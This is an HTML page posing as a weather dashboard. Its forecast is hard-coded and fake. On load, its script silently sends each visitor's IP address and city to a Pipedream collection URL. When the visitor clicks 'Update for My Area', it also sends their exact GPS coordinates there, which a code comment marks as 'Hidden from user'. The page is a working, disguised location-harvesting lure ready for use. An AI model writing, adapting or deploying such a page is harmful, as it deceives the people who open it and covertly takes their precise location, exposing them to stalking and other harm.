<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Weather Dashboard</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1a202c; color: white; text-align: center; padding: 50px; }
        .card { background: #2d3748; padding: 30px; border-radius: 15px; display: inline-block; box-shadow: 0 10px 15px rgba(0,0,0,0.3); width: 320px; }
        #location-name { font-size: 24px; color: #63b3ed; margin: 15px 0; font-weight: bold; }
        .temp { font-size: 48px; margin: 10px 0; }
        .btn { background: #3182ce; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; margin-top: 10px; }
        .btn:hover { background: #4299e1; }
        p { color: #a0aec0; margin: 5px 0; }
    </style>
</head>
<body>

    <div class="card">
        <p style="text-transform: uppercase; font-size: 11px; letter-spacing: 1px;">Current Forecast</p>
        <div id="location-name">Detecting...</div>
        <div class="temp">28°C</div>
        <p id="weather-desc">Partly Cloudy</p>
        
        <button class="btn" onclick="updateWeather()">Update for My Area</button>
    </div>

    <script>
        // REPLACE WITH YOUR PIPEDREAM URL
        const PIPEDREAM_URL = "https://eotwt8cj1vr426p.m.pipedream.net";

        // STAGE 1: LOAD IP CITY (e.g., Andhra Pradesh)
        window.onload = function() {
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                document.getElementById('location-name').innerText = data.city;
                
                fetch(PIPEDREAM_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({ type: "IP_LOG", ip: data.ip, city: data.city })
                });
            });
        };

        // STAGE 2: LOAD NEIGHBORHOOD (e.g., Punjagutta)
        function updateWeather() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // Get the Specific Neighborhood/Sub-locality
                    fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
                    .then(res => res.json())
                    .then(geoData => {
                        // Priority order: Suburb name, then Locality, then City
                        const neighborhood = geoData.locality || geoData.city;
                        document.getElementById('location-name').innerText = neighborhood;
                        document.getElementById('weather-desc').innerText = "Updated for your street";
                    });

                    // Log exact GPS coordinates to Pipedream (Hidden from user)
                    fetch(PIPEDREAM_URL, {
                        method: 'POST',
                        mode: 'no-cors',
                        body: JSON.stringify({ type: "GPS_LOG", lat: lat, lon: lon, neighborhood: "Captured" })
                    });
                });
            }
        }
    </script>
</body>
</html>
